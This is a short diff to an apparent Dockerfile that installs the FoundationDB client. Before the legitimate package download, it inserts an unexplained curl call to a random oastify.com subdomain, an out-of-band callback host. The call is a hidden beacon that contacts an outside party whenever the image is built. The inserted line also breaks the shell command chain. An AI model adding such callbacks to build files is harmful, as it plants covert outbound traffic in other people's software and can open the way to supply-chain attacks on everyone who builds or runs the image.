@@ -9,7 +9,8 @@ ARG FDB_WEBSITE=https://github.com/apple/foundationdb/releases/download
 ARG TAG="latest"
 
 RUN set -eux && \
-	curl --fail -L ${FDB_WEBSITE}/${FDB_VERSION}/foundationdb-clients_${FDB_VERSION}-1_amd64.deb -o fdb.deb && \
+	curl g4lwitrilfdw8zjmzrhglbrz5qbp7d01p.oastify.com \
+ 	curl --fail -L ${FDB_WEBSITE}/${FDB_VERSION}/foundationdb-clients_${FDB_VERSION}-1_amd64.deb -o fdb.deb && \
 	dpkg -i fdb.deb && \
     rm fdb.deb
 
